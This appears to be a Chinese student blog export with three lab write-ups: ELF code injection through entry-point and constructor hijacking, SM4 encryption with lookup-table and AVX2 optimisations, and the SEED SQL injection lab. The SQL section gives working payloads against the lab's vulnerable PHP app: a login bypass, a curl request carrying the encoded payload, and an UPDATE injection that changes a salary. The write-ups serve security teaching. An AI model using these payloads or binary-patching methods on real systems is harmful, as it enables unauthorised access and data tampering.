<h4 id="2-4-Task-4：调用注入的代码"><a href="#2-4-Task-4：调用注入的代码" class="headerlink" title="2.4 Task 4：调用注入的代码"></a>2.4 Task 4：调用注入的代码</h4><h4 id="2-4-1-入口点修改"><a href="#2-4-1-入口点修改" class="headerlink" title="2.4.1 入口点修改"></a>2.4.1 入口点修改</h4><p>我们将使用十六进制编译器对入口点进行修改。首先为了使代码适合注入，需要将其汇编到包含经过二进制编码的汇编指令和数据的原始二进制文件中。命令创建了hello.bin文件，包含适合注入的原始二进制指令和数据，然后我们使用elfinject注入文件，并使用十六进制编辑器重写ELF入口点。</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420104841413.png" alt="image-20230420104841413"></p>
<p>下面我们可以看到程序的入口点地址0x4049a0,这是注入代码输出hello word消息时的跳转地址，而还可以使用readelf看到注入的节实际上从0x800e78开始，这是因为elfinject稍微修改了地址来满足对齐要求。<img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420105354908.png" alt="image-20230420105354908"></p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420105422559.png" alt="image-20230420105422559"></p>
<p>因为入口点未修改，这时候运行ls.entry和ls行为一致，下面使用Hexedit修改入口点，这里主要存储数据实际是小端，而我们在之前的过程中直接读取了二进制文件的内容，修改后可以发现成功打印出hello world!</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420105754321.png" alt="image-20230420105754321"></p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420110350350.png" alt="image-20230420110350350"></p>
<h4 id="2-4-2-劫持构造函数和析构函数"><a href="#2-4-2-劫持构造函数和析构函数" class="headerlink" title="2.4.2 劫持构造函数和析构函数"></a>2.4.2 劫持构造函数和析构函数</h4><p>通过覆盖构造函数或者析构函数指针，我们可以在main函数之前或者之后调用注入的代码，具体取决于覆盖哪一个指针。</p>
<p>首先我们还是创建一个ls可执行文件的副本，通过elfinject将注入代码注入到里面，但是不修改入口点，然后通过readelf可以看到.init_array节也就是构造函数。</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420111342230.png" alt="image-20230420111342230"></p>
<p>下面使用objdump来查看.init_array的内容，其中这个节的内容也就是构造函数入口指针的值，也是通过小端进行存储</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420111552067.png" alt="image-20230420111552067"></p>
<p>下面就是将构造函数指针的值修改为注入函数的入口地址</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420112909884.png" alt="image-20230420112909884"></p>
<p>修改后进行运行，结果发现会不断打印hello world!，分析发现注入的代码是hello.bin而不是hello-ctor.bin，而后者应该有入口点交还这一操作。重新按照思路修改，成功！</p>
<p><img src="https://fastly.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230420113348176.png" alt="image-20230420113348176"></p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2022/12/08/SM4/</url>
    <content><![CDATA[<p>mathjax: true</p>
<h2 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h2><p><a href="http://www.gmbz.org.cn/main/viewfile/20180108015408199368.html">www.gmbz.org.cn/main/viewfile/20180108015408199368.html</a></p>
<p>加解密运算<br>1.首先将输入的128bit明文分成 4个32bit的数据$x_{0},x_{1},x_{2},x_{3}$,并作32轮轮变换.<br>2.$x_{i}$暂时不做处理，将$x_{i+1},x_{i+2},x_{i+3}$和轮密钥$rk_{i}$异或得到一个32bit都数据，作为S盒变换的输入.<br>3.下面进行S盒变换的过程，每个S盒的输入都是8位的一个字节，将这8位的前4位对应的16进制数作为行编号，后4位作为列编号，然后用S盒中对应位置的数进行代替.<br>4.然后将刚才Sbox的结果分别循环左移2，10，18，24位，得到的数与Sbox的输出进行异或然后得到$x_{i+4}$.<br>5.将最后输出的$x_{35},x_{34},x_{33},x_{32}$合并成一个128bit都数据，最为最后的结果进行输出.<br>6.解密的过程和加密的过程其实没有本质区别，由于是对称密码方案，在解密时我们只需要将32轮的轮密钥反序使用即可。</p>
<p>我们按照SM4实现的相关步骤首先实现了SM4的基础实现版本，下面我们对SM4进行加速优化</p>
<h5 id="P1-查表优化"><a href="#P1-查表优化" class="headerlink" title="P1 查表优化"></a>P1 查表优化</h5><p>为了提升效率，我们可以将S盒和后续的循环移位运算进行合并</p>
<p>1.预计算，生成查找表</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//4个T表</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> Table0[<span class="number">256</span>];</span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> Table1[<span class="number">256</span>];</span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> Table2[<span class="number">256</span>];</span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> Table3[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">S_replace</span><span class="params">(<span class="type">uint8_t</span> in)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> xlable = in &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    <span class="type">uint8_t</span> ylable = in &lt;&lt; <span class="number">4</span>;</span><br><span class="line">    ylable = ylable &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    <span class="type">int</span> index = xlable * <span class="number">16</span> + ylable;</span><br><span class="line">    <span class="keyword">return</span> SBox[index];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">Cycle_shift_left</span><span class="params">(<span class="type">uint32_t</span> num, <span class="type">int</span> shift)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (num &lt;&lt; shift) ^ (num &gt;&gt; (<span class="number">32</span> - shift));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">L</span><span class="params">(<span class="type">uint32_t</span> num)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> num = Cycle_shift_left(num, <span class="number">2</span>) ^ Cycle_shift_left(num, <span class="number">10</span>) ^ Cycle_shift_left(num, <span class="number">18</span>) ^ Cycle_shift_left(num, <span class="number">24</span>)^num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">generate_table</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        Table0[i] = L(((<span class="type">uint32_t</span>)S_replace((<span class="type">uint8_t</span>)i)) &lt;&lt;<span class="number">24</span>);</span><br><span class="line">        Table1[i] = L(((<span class="type">uint32_t</span>)S_replace((<span class="type">uint8_t</span>)i)) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">        Table2[i] = L(((<span class="type">uint32_t</span>)S_replace((<span class="type">uint8_t</span>)i)) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">        Table3[i] = L(((<span class="type">uint32_t</span>)S_replace((<span class="type">uint8_t</span>)i)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将最后32bit合并成4个表进行操作，在T操作中将最后的结果进行异或合并</p>
<p>2.在加密过程中应用查表</p>
<h5 id="P2-查表优化-SIMD单指令多数据优化"><a href="#P2-查表优化-SIMD单指令多数据优化" class="headerlink" title="P2 查表优化+SIMD单指令多数据优化"></a>P2 查表优化+SIMD单指令多数据优化</h5><p>具体实现如下，这里我们结合了查表优化策略</p>
<p>1.加载8组消息至$imm_{i},is \in [0,3]$</p>
<p>2.通过pack进行打包，使得$X_{i}$对应第i个小分组<br>3.迭代32轮</p>
<p>4.$K_{i}$是轮密钥，$Temp \leftarrow X_{1} \oplus X_{2}\oplus X_{3}\oplus K_{i} $,$Temp \leftarrow T(Temp)\oplus X_{0}$</p>
<p>5.$X_{0},X_{1},X_{2},X_{3}\leftarrow X_{1},X_{2},X_{3},Temp$</p>
<p>6.$X_{0},X_{1},X_{2},X_{3} \leftarrow  X_{3},X_{2},X_{1},X_{0}$</p>
<p>7.unpack，将$X_{i}$打包回原始的状态$imm_{i}$</p>
<p>8.存储$imm_{i}$到对应的内存</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">SM4_encryption</span><span class="params">(<span class="type">uint8_t</span>* ciphertext)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">36</span>];</span><br><span class="line">    k[<span class="number">0</span>] = MK[<span class="number">0</span>] ^ FK[<span class="number">0</span>]; k[<span class="number">1</span>] = MK[<span class="number">1</span>] ^ FK[<span class="number">1</span>]; k[<span class="number">2</span>] = MK[<span class="number">2</span>] ^ FK[<span class="number">2</span>]; k[<span class="number">3</span>] = MK[<span class="number">3</span>] ^ FK[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        rK[i] = k[i + <span class="number">4</span>] = k[i] ^ RoundK(k[i + <span class="number">3</span>] ^ k[i + <span class="number">2</span>] ^ k[i + <span class="number">1</span>] ^ CK[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    __m256i X[<span class="number">4</span>], Temp[<span class="number">4</span>], Mask;</span><br><span class="line">    Mask = _mm256_set1_epi32(<span class="number">0xFF</span>);</span><br><span class="line">    <span class="comment">//加载数据</span></span><br><span class="line">    Temp[<span class="number">0</span>] = _mm256_loadu_si256((<span class="type">const</span> __m256i*)plaintext + <span class="number">0</span>);</span><br><span class="line">    Temp[<span class="number">1</span>] = _mm256_loadu_si256((<span class="type">const</span> __m256i*)plaintext + <span class="number">1</span>);</span><br><span class="line">    Temp[<span class="number">2</span>] = _mm256_loadu_si256((<span class="type">const</span> __m256i*)plaintext + <span class="number">2</span>);</span><br><span class="line">    Temp[<span class="number">3</span>] = _mm256_loadu_si256((<span class="type">const</span> __m256i*)plaintext + <span class="number">3</span>);</span><br><span class="line">    <span class="comment">//合并每组128bit数据的某32bit字</span></span><br><span class="line">    X[<span class="number">0</span>] = MM256_PACK0_EPI32(Temp[<span class="number">0</span>], Temp[<span class="number">1</span>], Temp[<span class="number">2</span>], Temp[<span class="number">3</span>]);</span><br><span class="line">    X[<span class="number">1</span>] = MM256_PACK1_EPI32(Temp[<span class="number">0</span>], Temp[<span class="number">1</span>], Temp[<span class="number">2</span>], Temp[<span class="number">3</span>]);</span><br><span class="line">    X[<span class="number">2</span>] = MM256_PACK2_EPI32(Temp[<span class="number">0</span>], Temp[<span class="number">1</span>], Temp[<span class="number">2</span>], Temp[<span class="number">3</span>]);</span><br><span class="line">    X[<span class="number">3</span>] = MM256_PACK3_EPI32(Temp[<span class="number">0</span>], Temp[<span class="number">1</span>], Temp[<span class="number">2</span>], Temp[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    __m256i vindex =</span><br><span class="line">        _mm256_setr_epi8(<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span>,</span><br><span class="line">            <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span>);</span><br><span class="line">    X[<span class="number">0</span>] = _mm256_shuffle_epi8(X[<span class="number">0</span>], vindex);</span><br><span class="line">    X[<span class="number">1</span>] = _mm256_shuffle_epi8(X[<span class="number">1</span>], vindex);</span><br><span class="line">    X[<span class="number">2</span>] = _mm256_shuffle_epi8(X[<span class="number">2</span>], vindex);</span><br><span class="line">    X[<span class="number">3</span>] = _mm256_shuffle_epi8(X[<span class="number">3</span>], vindex);</span><br><span class="line">    <span class="comment">// 32轮迭代</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        __m256i k =</span><br><span class="line">            _mm256_set1_epi32(rK[i]);</span><br><span class="line">        Temp[<span class="number">0</span>] = _mm256_xor_si256(_mm256_xor_si256(X[<span class="number">1</span>], X[<span class="number">2</span>]),</span><br><span class="line">            _mm256_xor_si256(X[<span class="number">3</span>], k));</span><br><span class="line">        <span class="comment">//查表</span></span><br><span class="line">        Temp[<span class="number">1</span>] = _mm256_xor_si256(</span><br><span class="line">            X[<span class="number">0</span>], _mm256_i32gather_epi32((<span class="type">const</span> <span class="type">int</span>*)Table0,</span><br><span class="line">                _mm256_and_si256(Temp[<span class="number">0</span>], Mask), <span class="number">4</span>));</span><br><span class="line">        Temp[<span class="number">0</span>] = _mm256_srli_epi32(Temp[<span class="number">0</span>], <span class="number">8</span>);</span><br><span class="line">        Temp[<span class="number">1</span>] = _mm256_xor_si256(</span><br><span class="line">            Temp[<span class="number">1</span>], _mm256_i32gather_epi32(</span><br><span class="line">                (<span class="type">const</span> <span class="type">int</span>*)Table1, _mm256_and_si256(Temp[<span class="number">0</span>], Mask), <span class="number">4</span>));</span><br><span class="line">        Temp[<span class="number">0</span>] = _mm256_srli_epi32(Temp[<span class="number">0</span>], <span class="number">8</span>);</span><br><span class="line">        Temp[<span class="number">1</span>] = _mm256_xor_si256(</span><br><span class="line">            Temp[<span class="number">1</span>], _mm256_i32gather_epi32(</span><br><span class="line">                (<span class="type">const</span> <span class="type">int</span>*)Table2, _mm256_and_si256(Temp[<span class="number">0</span>], Mask), <span class="number">4</span>));</span><br><span class="line">        Temp[<span class="number">0</span>] = _mm256_srli_epi32(Temp[<span class="number">0</span>], <span class="number">8</span>);</span><br><span class="line">        Temp[<span class="number">1</span>] = _mm256_xor_si256(</span><br><span class="line">            Temp[<span class="number">1</span>], _mm256_i32gather_epi32(</span><br><span class="line">                (<span class="type">const</span> <span class="type">int</span>*)Table3, _mm256_and_si256(Temp[<span class="number">0</span>], Mask), <span class="number">4</span>));</span><br><span class="line"></span><br><span class="line">        X[<span class="number">0</span>] = X[<span class="number">1</span>];</span><br><span class="line">        X[<span class="number">1</span>] = X[<span class="number">2</span>];</span><br><span class="line">        X[<span class="number">2</span>] = X[<span class="number">3</span>];</span><br><span class="line">        X[<span class="number">3</span>] = Temp[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//转化端序</span></span><br><span class="line">    X[<span class="number">0</span>] = _mm256_shuffle_epi8(X[<span class="number">0</span>], vindex);</span><br><span class="line">    X[<span class="number">1</span>] = _mm256_shuffle_epi8(X[<span class="number">1</span>], vindex);</span><br><span class="line">    X[<span class="number">2</span>] = _mm256_shuffle_epi8(X[<span class="number">2</span>], vindex);</span><br><span class="line">    X[<span class="number">3</span>] = _mm256_shuffle_epi8(X[<span class="number">3</span>], vindex);</span><br><span class="line">    <span class="comment">//恢复分组并装填</span></span><br><span class="line">    _mm256_storeu_si256((__m256i*)ciphertext + <span class="number">0</span>,</span><br><span class="line">        MM256_PACK0_EPI32(X[<span class="number">3</span>], X[<span class="number">2</span>], X[<span class="number">1</span>], X[<span class="number">0</span>]));</span><br><span class="line">    _mm256_storeu_si256((__m256i*)ciphertext + <span class="number">1</span>,</span><br><span class="line">        MM256_PACK1_EPI32(X[<span class="number">3</span>], X[<span class="number">2</span>], X[<span class="number">1</span>], X[<span class="number">0</span>]));</span><br><span class="line">    _mm256_storeu_si256((__m256i*)ciphertext + <span class="number">2</span>,</span><br><span class="line">        MM256_PACK2_EPI32(X[<span class="number">3</span>], X[<span class="number">2</span>], X[<span class="number">1</span>], X[<span class="number">0</span>]));</span><br><span class="line">    _mm256_storeu_si256((__m256i*)ciphertext + <span class="number">3</span>,</span><br><span class="line">        MM256_PACK3_EPI32(X[<span class="number">3</span>], X[<span class="number">2</span>], X[<span class="number">1</span>], X[<span class="number">0</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="代码运行和结果验证"><a href="#代码运行和结果验证" class="headerlink" title="代码运行和结果验证"></a>代码运行和结果验证</h4><p>这里分别对相应代码进行运行即可</p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20220730143943862.png" alt="image-20220730143943862"></p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20220730145131205.png" alt="image-20220730145131205"></p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20220730145117591.png" alt="image-20220730145117591"></p>
<p>最终优化结果和时间</p>
<p>一种python实现方案</p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20220730145608565.png" alt="image-20220730145608565"></p>
]]></content>
  </entry>
  <entry>
    <title>seedlab(二)</title>
    <url>/2023/01/05/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h3 id="1-实验目的"><a href="#1-实验目的" class="headerlink" title="1      实验目的"></a>1      实验目的</h3><p>​    SQL 注入是一种代码注入技术，利用 Web 应用程序和数据库服务器之间接口的漏洞。当用户的输入 没有被 Web 应用程序正确检查就被发送到后端数据库服务器时，就会出现 SQL 注入漏洞。本次实验需要我们熟悉SQL语句，了解如何进行SQL注入共计，并且能够掌握一些防范此类共计的方法。</p>
<p>本实验覆盖以下主题：</p>
<p>1.SQL语句：SELECT与UPDATA</p>
<p>2.SQL注入</p>
<p>3.语句预处理</p>
<h3 id="2-实验步骤与结果"><a href="#2-实验步骤与结果" class="headerlink" title="2     实验步骤与结果"></a>2     实验步骤与结果</h3><h4 id="2-1-环境设置"><a href="#2-1-环境设置" class="headerlink" title="2.1    环境设置"></a>2.1    环境设置</h4><p>​    此次实验使用一个已经开发好的 Web 应用程序，并使用容器1来设置这个 Web 应用程序。实验使用 两个容器，一个用于托管 Web 应用程序，另一个用于托管 Web 应用程序的数据库。我们需要将主机名映射到容器的IP地址，这里我们需要在root权限下修改/etc/hosts文件，将SQL注入网址映射到托管Web应用程序的容器IP。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221014212525418.png" alt="image-20221014212525418" style="zoom: 67%;" /></p>
<p>​    然后我们需要使用dcbuild和dcup命令创建并运行容器，然后熟悉SQL语句的基本用法。</p>
<h4 id="2-2-Task-1：熟悉SQL语句"><a href="#2-2-Task-1：熟悉SQL语句" class="headerlink" title="2.2 Task 1：熟悉SQL语句"></a>2.2 Task 1：熟悉SQL语句</h4><p>​    Task 1 的目标是通过使用提供的数据库来熟悉 SQL 命令。Web 应用程序所使用的数据存储在 MySQL 数据库中，由 MySQL 容器托管。这里有一个名为 sqllab_users 的数据库，其中包含一个名为 credential 的表。先使用dockps命令列出所有的容器，然后使用dosksh命令进入托管web应用的数据库容器，通过mysql程序登录数据库系统，出现mysql&gt;表示登录成功。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221014110846011.png" alt="image-20221014110846011" style="zoom: 67%;" /></p>
<p>​    登录客户端以后，由于我们已经创建了 sqllab_users 数据库，只需使用 use 命令加载这个已有的数据库。可以使用show tables打印出所选数据库中的表，如图可以看到所选数据库中有一个名为credential的表。</p>
<p>​    接下来是使用一条SQL语句返回Alice的资料信息，这里我们使用SELECT命令,这里注意一定要加上；否则语句无法执行。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> credential <span class="keyword">where</span> Name<span class="operator">=</span><span class="string">&#x27;Alice&#x27;</span>;</span><br><span class="line">#从表中Name<span class="operator">=</span><span class="string">&#x27;Alice&#x27;</span>的项返回全部数据</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221014111517950.png" alt="image-20221014111517950" style="zoom:67%;" /></p>
<h4 id="2-3-Task-2：基于SELECT语句的SQL注入攻击"><a href="#2-3-Task-2：基于SELECT语句的SQL注入攻击" class="headerlink" title="2.3 Task 2：基于SELECT语句的SQL注入攻击"></a>2.3 Task 2：基于SELECT语句的SQL注入攻击</h4><h5 id="Task-2-1-基于网页的SQL注入攻击"><a href="#Task-2-1-基于网页的SQL注入攻击" class="headerlink" title="Task 2.1:基于网页的SQL注入攻击"></a>Task 2.1:基于网页的SQL注入攻击</h5><p>​        位于目录/var/www/SQL_Injection 下的 PHP 代码 unsafe_home.php 为进行用户认证的代码。下面的代码片段显示了用户是如何被认证的。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> $input_uname <span class="operator">=</span> $_GET[ ’ username ’ ];</span><br><span class="line"><span class="number">2</span> $input_pwd <span class="operator">=</span> $_GET[ ’ Password ’ ];</span><br><span class="line"><span class="number">3</span> $hashed_pwd <span class="operator">=</span> sha1($input_pwd);</span><br><span class="line"><span class="number">4</span> ...</span><br><span class="line"><span class="number">5</span> $<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT id, name , eid, salary , birth , ssn, address , email ,</span><br><span class="line">6 nickname , Password</span><br><span class="line">7 FROM credential</span><br><span class="line">8 WHERE name= ’ $input_uname ’ and Password= ’ $hashed_pwd ’ &quot;;</span><br><span class="line"><span class="number">9</span> $<span class="keyword">result</span> <span class="operator">=</span> $conn <span class="operator">-</span><span class="operator">&gt;</span> query($<span class="keyword">sql</span>);</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">11</span> <span class="operator">/</span><span class="operator">/</span> The following <span class="keyword">is</span> Pseudo Code</span><br><span class="line"><span class="number">12</span> if(id <span class="operator">!=</span> <span class="keyword">NULL</span>) &#123;</span><br><span class="line"><span class="number">13</span> if(name<span class="operator">=</span><span class="operator">=</span> ’ admin ’ ) &#123;</span><br><span class="line"><span class="number">14</span> <span class="keyword">return</span> <span class="keyword">All</span> employees information;</span><br><span class="line"><span class="number">15</span> &#125; <span class="keyword">else</span> if (name <span class="operator">!=</span><span class="keyword">NULL</span>)&#123;</span><br><span class="line"><span class="number">16</span> <span class="keyword">return</span> employee information;</span><br><span class="line"><span class="number">17</span> &#125;</span><br><span class="line"><span class="number">18</span> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">19</span> Authentication Fails;</span><br><span class="line"><span class="number">20</span> &#125;</span><br></pre></td></tr></table></figure>
<p>​        从代码中分析可知，用户需要输入用户名和密码，然后php脚本将采用SELECT语句中的where子句进行匹配。因此，可以通过在Username中输入数据和代码相混合使后面的语句被注释而无法执行，这样就达到了只匹配用户名的效果，从而绕过了对口令的验证。</p>
<p>​    这里我们在USERNAME中输入admin’;#,相当于执行了下面的语句。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id, name , eid, salary , birth , ssn, address , email ,nickname , Password</span><br><span class="line"><span class="keyword">FROM</span> credential</span><br><span class="line"><span class="keyword">WHERE</span> name<span class="operator">=</span> ’ admin ’;# <span class="keyword">and</span> Password<span class="operator">=</span> ’ $hashed_pwd ’;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221014112100657.png" alt="image-20221014112100657" style="zoom:67%;" /></p>
<p>​    攻击结果如下图所示，我们已经成功获取了User Details</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221014112119031.png" alt="image-20221014112119031"></p>
<h5 id="Task-2-2-基于命令行的SQL注入攻击"><a href="#Task-2-2-基于命令行的SQL注入攻击" class="headerlink" title="Task 2.2:基于命令行的SQL注入攻击"></a>Task 2.2:基于命令行的SQL注入攻击</h5><p>​    在不使用网页的情况下完成 Task 2.1 的目标。你可以使用命令 行工具，如 curl，它可以发送 HTTP 请求。在 HTTP 请求中包含多个参数，需要把 URL 和参数用一 对单引号括起来。否则，用于分隔参数的特殊字符 (如 &amp;) 会被 shell 曲解，造成命令歧义。在用户名和口令字段中包含特殊字符，特殊字符需要进行编码，否则可能会造成命令歧义。</p>
<p>​    我们可以按照示例将username中的参数改成Task 2.1中参数的http编码形式，也可以在命令行输入框中查看输入username后的状态。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221014220104300.png" alt="image-20221014220104300" style="zoom:67%;" /></p>
<p>​     按照URL编码形式，我们将admin’;#转化为admin%27%3b%23,然后shell中输入以下的命令。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl &#x27;www.seed-server.com/unsafe_home.php?username=admin%27%3b%23&#x27;</span><br></pre></td></tr></table></figure>
<p>​     可以看到成功发送了HTTP Request请求，并获得了web服务器返回的html内容，可以看出里面包含了表单的相关内容。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221015111240404.png" alt="image-20221015111240404" style="zoom:67%;" /></p>
<p>​     将返回的内容存入.html文件，并放入web浏览器进行解析，可以看到所有员工的Datails被打印出来。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221014114314180.png" alt="image-20221014114314180"></p>
<h5 id="Task-2-3-增加一条新的SQL语句"><a href="#Task-2-3-增加一条新的SQL语句" class="headerlink" title="Task 2.3:增加一条新的SQL语句"></a>Task 2.3:增加一条新的SQL语句</h5><p>​    在上面的任务中，我们只能在数据库中窃取信息，但是却无法更改表单的内容，在下面的SQL语句中，我们将注释内容替换为一条update语句，目的是将Alice的Salary进行更改。（两条语句之间用；隔开）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27;;update credential set Salary=0 where Name=&#x27;</span>Alice<span class="string">&#x27;;#</span></span><br></pre></td></tr></table></figure>
<p>​     输入username的位置，可以发现web服务器返回下面的内容，SQL语句出现了语法错误。查找原因发现，这种攻击对mysql无效，因为PHP中mysqli扩展的query()函数禁止执行多条语句。如果需要一次执行多条SQL命令，就必须使用mysqli对象中的 multi_query()方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221014160820005.png" alt="image-20221014160820005" style="zoom:67%;" /></p>
<h4 id="2-4-Task-3：基于SELECT语句的SQL注入攻击"><a href="#2-4-Task-3：基于SELECT语句的SQL注入攻击" class="headerlink" title="2.4 Task 3：基于SELECT语句的SQL注入攻击"></a>2.4 Task 3：基于SELECT语句的SQL注入攻击</h4><h5 id="Task-3-1-修改自己的工资"><a href="#Task-3-1-修改自己的工资" class="headerlink" title="Task 3.1:修改自己的工资"></a>Task 3.1:修改自己的工资</h5><p>​    登录Alice的系统，可以看到如下编辑界面，其中可以修改员工的昵称、电子邮件、地址、电话号码和口令，但是工资等敏感信息无法被修改。查看代码可以知道，修改方式是通过一条简单的update语句进行执行，将对应用户id下的相关内容更改为输入内容。</p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20221014162048324.png" alt="image-20221014162048324" style="zoom:67%;" /></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$hashed_pwd <span class="operator">=</span> sha1($input_pwd);</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;UPDATE credential SET</span><br><span class="line">	nickname=&#x27;$input_nickname&#x27;,</span><br><span class="line">	email=&#x27;$input_email&#x27;,</span><br><span class="line">	address=&#x27;$input_address&#x27;,</span><br><span class="line">	Password=&#x27;$hashed_pwd&#x27;,</span><br><span class="line">	PhoneNumber=&#x27;$input_phonenumber&#x27;</span><br><span class="line">	WHERE ID=$id;&quot;;</span><br><span class="line">$conn<span class="operator">-</span><span class="operator">&gt;</span>query($<span class="keyword">sql</span>);</span><br></pre></td></tr></table></figure>
<p>​     实现对Salary的更改，我们只需要将相关更新语句输入到第一个输入框中，并将后面不关心的内容注释掉即可。这里注意单纯输入Salary字段是不行的，因为我们要在输入框构造对应位置的注入，需要提供对应字段的值。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">AL<span class="string">&#x27;,Salary = &#x27;</span><span class="number">100000</span><span class="string">&#x27; where ID = 1#;</span></span><br></pre></td></tr></table></figure>
<p>​     执行后可以发现Salary字段已经被更改成了100000，注入位置Nickname被改成了AL。</p>
<p>​                                          <img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221015161109276.png" alt="image-20221015161109276" style="zoom:67%;" />    </p>
<pre><code>  当然也可以选择不同的注入位置，下面我们可以在Email位置进行注入，相当于执行了下面的SQL语句。
